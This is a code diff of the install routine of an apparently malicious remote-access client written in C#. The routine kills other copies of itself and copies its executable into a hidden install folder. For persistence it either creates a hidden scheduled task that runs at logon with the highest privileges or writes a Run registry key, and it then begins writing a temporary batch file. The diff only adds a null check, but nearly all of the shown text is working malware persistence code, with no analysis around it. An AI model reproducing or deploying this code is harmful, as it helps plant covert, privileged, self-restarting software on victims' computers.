@@ -21,45 +21,50 @@ namespace Client.Install
       try
       {
         FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
-        string fileName = Process.GetCurrentProcess().MainModule.FileName;
-        if (!(fileName != fileInfo.FullName))
-          return;
-        foreach (Process process in Process.GetProcesses())
+        var processModule = Process.GetCurrentProcess().MainModule;
+        if (processModule != null)
         {
-          try
+          string fileName = processModule.FileName;
+          if (!(fileName != fileInfo.FullName))
+            return;
+          foreach (Process process in Process.GetProcesses())
           {
-            if (process.MainModule.FileName == fileInfo.FullName)
-              process.Kill();
+            try
+            {
+              if (process.MainModule.FileName == fileInfo.FullName)
+                process.Kill();
+            }
+            catch
+            {
+            }
           }
-          catch
+          if (Methods.IsAdmin())
           {
+            Process.Start(new ProcessStartInfo()
+            {
+              FileName = "cmd",
+              Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit",
+              WindowStyle = ProcessWindowStyle.Hidden,
+              CreateNoWindow = true
+            });
           }
-        }
-        if (Methods.IsAdmin())
-        {
-          Process.Start(new ProcessStartInfo()
+          else
           {
-            FileName = "cmd",
-            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit",
-            WindowStyle = ProcessWindowStyle.Hidden,
-            CreateNoWindow = true
-          });
+            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree))
+              registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), (object) ("\"" + fileInfo.FullName + "\""));
+          }
+          if (File.Exists(fileInfo.FullName))
+          {
+            File.Delete(fileInfo.FullName);
+            Thread.Sleep(1000);
+          }
+          FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
+          byte[] numArray = File.ReadAllBytes(fileName);
+          byte[] buffer = numArray;
+          int length = numArray.Length;
+          fileStream.Write(buffer, 0, length);
         }
-        else
-        {
-          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree))
-            registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), (object) ("\"" + fileInfo.FullName + "\""));
-        }
-        if (File.Exists(fileInfo.FullName))
-        {
-          File.Delete(fileInfo.FullName);
-          Thread.Sleep(1000);
-        }
-        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
-        byte[] numArray = File.ReadAllBytes(fileName);
-        byte[] buffer = numArray;
-        int length = numArray.Length;
-        fileStream.Write(buffer, 0, length);
+
         Methods.ClientOnExit();
         string path = Path.GetTempFileName() + ".bat";
         using (StreamWriter streamWriter = new StreamWriter(path))
